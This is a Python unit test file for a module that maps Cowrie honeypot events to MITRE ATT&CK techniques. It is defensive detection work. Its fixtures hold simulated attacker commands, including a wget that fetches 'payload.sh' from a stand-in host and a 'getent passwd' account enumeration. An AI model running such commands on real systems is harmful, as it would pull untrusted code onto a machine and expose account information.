import unittest

import pandas as pd

from src.mitre import CATALOG, map_events


class TestMitreTechniqueMapping(unittest.TestCase):
    def test_supported_authentication_and_command_mappings(self):
        events = [
            {"timestamp": "2026-01-01T00:00:00Z", "src_ip": "192.0.2.1", "session": "s1", "eventid": "cowrie.login.failed"},
            {"timestamp": "2026-01-01T00:00:01Z", "src_ip": "192.0.2.1", "session": "s1", "eventid": "cowrie.login.failed"},
            {"timestamp": "2026-01-01T00:00:02Z", "src_ip": "192.0.2.1", "session": "s1", "eventid": "cowrie.command.input", "command": "uname -a"},
            {"timestamp": "2026-01-01T00:00:03Z", "src_ip": "192.0.2.1", "session": "s1", "eventid": "cowrie.command.input", "command": "ls -la /tmp"},
            {"timestamp": "2026-01-01T00:00:04Z", "src_ip": "192.0.2.1", "session": "s1", "eventid": "cowrie.command.input", "command": "getent passwd"},
            {"timestamp": "2026-01-01T00:00:05Z", "src_ip": "192.0.2.1", "session": "s1", "eventid": "cowrie.command.input", "command": "whoami"},
            {"timestamp": "2026-01-01T00:00:06Z", "src_ip": "192.0.2.1", "session": "s1", "eventid": "cowrie.command.input", "command": "wget https://example.invalid/payload.sh"},
        ]
        mapped = {row["technique_id"]: row for row in map_events(events)}
        self.assertTrue({"T1110.001", "T1059.004", "T1105", "T1082", "T1083", "T1087.001", "T1033"}.issubset(mapped))
        self.assertEqual(mapped["T1110.001"]["event_count"], 2)
        self.assertEqual(mapped["T1105"]["evidence_examples"], ["wget https://example.invalid/payload.sh"])
        self.assertEqual(mapped["T1082"]["tactic"], "Discovery")
        self.assertEqual(mapped["T1059.004"]["sources"][0]["session_ids"], ["s1"])

    def test_unsupported_events_and_weak_download_evidence_are_not_mapped(self):
        events = [
            {"src_ip": "192.0.2.2", "session": "s2", "eventid": "cowrie.login.success", "timestamp": "2026-01-01T00:00:00Z"},
            {"src_ip": "192.0.2.2", "session": "s2", "eventid": "cowrie.command.input", "command": "curl --help", "timestamp": "2026-01-01T00:00:01Z"},
            {"src_ip": "192.0.2.2", "session": "s2", "eventid": "cowrie.command.input", "command": "echo ordinary text", "timestamp": "2026-01-01T00:00:02Z"},
        ]
        mapped = {row["technique_id"]: row for row in map_events(events)}
        self.assertEqual(set(mapped), {"T1059.004"})
        self.assertNotIn("T1105", mapped)
        self.assertNotIn("T1078", CATALOG)

    def test_confidence_thresholds_use_event_and_session_evidence(self):
        rows = [
            {"src_ip": "192.0.2.3", "session": "s1", "eventid": "cowrie.login.failed", "timestamp": "2026-01-01T00:00:00Z"},
            {"src_ip": "192.0.2.3", "session": "s1", "eventid": "cowrie.login.failed", "timestamp": "2026-01-01T00:00:01Z"},
        ]
        moderate = map_events(rows)[0]
        self.assertEqual(moderate["confidence"], "Moderate")
        rows.extend([
            {"src_ip": "192.0.2.3", "session": "s2", "eventid": "cowrie.login.failed", "timestamp": "2026-01-02T00:00:00Z"},
            {"src_ip": "192.0.2.3", "session": "s2", "eventid": "cowrie.login.failed", "timestamp": "2026-01-02T00:00:01Z"},
            {"src_ip": "192.0.2.3", "session": "s2", "eventid": "cowrie.login.failed", "timestamp": "2026-01-02T00:00:02Z"},
        ])
        high = map_events(rows)[0]
        self.assertEqual(high["confidence"], "High")
        self.assertEqual(high["first_seen"], "2026-01-01T00:00:00Z")
        self.assertEqual(high["last_seen"], "2026-01-02T00:00:02Z")

        command_rows = [
            {"src_ip": "192.0.2.6", "session": "s1", "eventid": "cowrie.command.input", "command": "id", "timestamp": "2026-01-01T00:00:00Z"},
            {"src_ip": "192.0.2.6", "session": "s1", "eventid": "cowrie.command.input", "command": "uname -a", "timestamp": "2026-01-01T00:00:01Z"},
            {"src_ip": "192.0.2.6", "session": "s2", "eventid": "cowrie.command.input", "command": "ls -la", "timestamp": "2026-01-02T00:00:00Z"},
        ]
        command_mapping = {row["technique_id"]: row for row in map_events(command_rows)}
        self.assertEqual(command_mapping["T1059.004"]["confidence"], "High")
        self.assertEqual(command_mapping["T1082"]["confidence"], "Moderate")

    def test_deterministic_aggregation_and_missing_fields(self):
        rows = [
            {"src_ip": "192.0.2.4", "session": "b", "eventid": "cowrie.command.input", "command": "ls", "timestamp": "2026-01-02T00:00:00Z"},
            {"src_ip": "192.0.2.4", "session": "a", "eventid": "cowrie.command.input", "command": "find /tmp", "timestamp": "2026-01-01T00:00:00Z"},
            {"eventid": "cowrie.command.input", "command": None, "timestamp": None},
            {"src_ip": "192.0.2.5", "eventid": "cowrie.login.failed"},
        ]
        first = map_events(rows)
        second = map_events(list(reversed(rows)))
        self.assertEqual(first, second)
        file_mapping = next(item for item in first if item["technique_id"] == "T1083")
        self.assertEqual(file_mapping["event_count"], 2)
        self.assertEqual(file_mapping["sources"][0]["session_ids"], ["a", "b"])
        self.assertEqual(file_mapping["sources"][0]["first_seen"], "2026-01-01T00:00:00Z")
        self.assertEqual(file_mapping["sources"][0]["last_seen"], "2026-01-02T00:00:00Z")

    def test_empty_data(self):
        self.assertEqual(map_events(None), [])
        self.assertEqual(map_events(pd.DataFrame()), [])
        self.assertEqual(map_events([{"src_ip": "192.0.2.9", "eventid": "cowrie.login.success"}]), [])


if __name__ == "__main__":
    unittest.main()
